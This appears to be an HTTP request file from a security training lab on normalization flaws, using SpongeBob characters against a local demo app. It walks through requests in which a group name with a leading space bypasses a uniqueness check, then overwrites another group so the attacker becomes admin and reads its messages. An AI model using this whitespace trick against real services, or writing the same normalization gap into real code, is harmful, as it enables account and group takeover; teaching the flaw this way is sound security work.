@base = http://localhost:8000/ii/normalization-canonicalization/example4

# We start with the same setup as previously, Plankton is unable to access Mr. Krabs group.
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Expect:
# Forbidden: not an member for the requested group

###

# Plankton uses `create_group` functionality with a malicious group name that passes uniqueness check,
# but actually is Mr. Krabs's group with an extra whitespace. This extra whitespace gets removed by the code,
# and handler performs group update instead of creating a new group.
POST {{base}}/groups/new
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
Content-Type: application/json

{
    "name": " staff@krusty-krab.sea",
    "users": [
        { "role": "member", "user": "spongebob@krusty-krab.sea" },
        { "role": "member", "user": "squidward@krusty-krab.sea" },
        { "role": "admin", "user": "mr.krabs@krusty-krab.sea" },
        { "role": "admin", "user": "plankton@chum-bucket.sea"}
      ],
    "messages": []
}

# Expect:
# {
#   "status": "ok"
# }

###

# Plankton now accesses the REAL Krusty Krab group (no leading space)
GET {{base}}/groups/staff@krusty-krab.sea/messages
Authorization: Basic plankton@chum-bucket.sea:burgers-are-yummy
# Results in sensitive data disclosure:
# [
#   {
#     "from_user": "mr.krabs@krusty-krab.sea",
#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
#   }
# ]
#
# IMPACT: Plankton has achieved complete group takeover through a whitespace-based
# TOCTOU (Time-Of-Check-Time-Of-Use) attack! The group creation uniqueness check
# sees " staff@krusty-krab.sea" (with leading space) as different from
# "staff@krusty-krab.sea", allowing creation to proceed. But the actual database
# update strips whitespace, causing an UPSERT that overwrites Mr. Krabs' group
# with Plankton as admin! Now Plankton has full admin privileges on the real
# Krusty Krab staff group - he can read all messages, post new ones, add/remove
# members, and completely control group communications. This is more severe than
# previous normalization attacks because it's not just data exfiltration - it's
# permanent privilege escalation through whitespace-based uniqueness bypass.
